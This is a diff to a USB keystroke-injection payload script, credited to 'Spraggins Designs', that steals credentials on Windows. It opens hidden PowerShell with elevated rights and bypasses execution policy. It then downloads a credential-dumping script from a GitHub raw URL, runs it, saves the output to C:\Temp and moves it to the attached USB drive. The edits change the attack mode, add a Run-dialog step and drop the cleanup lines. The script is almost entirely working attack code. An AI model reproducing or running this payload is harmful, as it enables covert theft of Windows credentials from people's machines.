@@ -4,14 +4,18 @@
 # Author: Spraggins Designs
 # Description: Downloads and runs a PowerShell script to dump credentials silently without GUI
 
-# Set the attack mode to HID and storage
-ATTACKMODE HID STORAGE
+# Set the attack mode to HID only
+ATTACKMODE HID
 
 # Wait for the system to be ready
 LED SETUP
 DELAY 3000
 
-# Open PowerShell as Administrator silently
+# Open Run dialog
+Q GUI r
+DELAY 500
+
+# Type the PowerShell command to start as Administrator
 Q STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \"C:\\Temp\\run_script.ps1\"' -Verb runAs -WindowStyle Hidden"
 Q ENTER
 DELAY 1500
@@ -25,7 +29,7 @@ Q STRING $script = @'
 Q ENTER
 Q STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/spragginsdesigns/Win11-PWDump/main/dumpAllCreds.ps1" -OutFile "$env:TEMP\\dumpAllCreds.ps1"
 Q ENTER
-Q STRING & "$env:TEMP\\dumpAllCreds.ps1" > "C:\\Temp\\credentials.txt"
+Q STRING & "$env:TEMP\\dumpAllCreds.ps1" | Out-File -FilePath "C:\\Temp\\credentials.txt"
 Q ENTER
 Q STRING '@
 Q ENTER
@@ -39,14 +43,6 @@ DELAY 500
 Q STRING Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File "C:\\Temp\\run_script.ps1"' -Verb runAs -WindowStyle Hidden
 Q ENTER
 DELAY 1500
-
-# Clean up the temporary script file and any downloaded files (uncomment to activate)
-#Q STRING Remove-Item -Path "C:\\Temp\\run_script.ps1" -Force
-#Q ENTER
-#DELAY 500
-#Q STRING Remove-Item -Path "$env:TEMP\\dumpAllCreds.ps1" -Force
-#Q ENTER
-#DELAY 500
 
 # Move the credentials file to the USB storage for easy retrieval
 Q STRING Move-Item -Path "C:\\Temp\\credentials.txt" -Destination "E:\\credentials.txt" -Force
